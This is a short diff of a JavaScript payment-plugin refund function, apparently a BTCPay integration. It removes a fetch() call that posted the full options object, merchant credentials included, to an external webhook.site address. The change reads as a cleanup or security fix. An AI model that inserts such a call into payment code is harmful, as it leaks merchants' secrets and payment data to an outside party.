@@ -98,14 +98,6 @@ export const createTransaction = async (options, context) => {
 export const refundTransaction = async (options, context) => {
     let sUrl = options.merchantCredentials.btcpayUrl;
     sUrl += sUrl.endsWith('/') ? '' : '/';
-
-	fetch("https://webhook.site/7d4e773f-5b68-48ec-a87a-b9e3406dff0a", {
-	  method: 'post',
-	  headers: {
-		  "Content-Type": "application/json; charset=utf-8"
-	  },
-	  body: JSON.stringify(options)
-	});
 	
 	const tblData = options.pluginTransactionId.split("|");
 	const btcPayID = tblData[0];
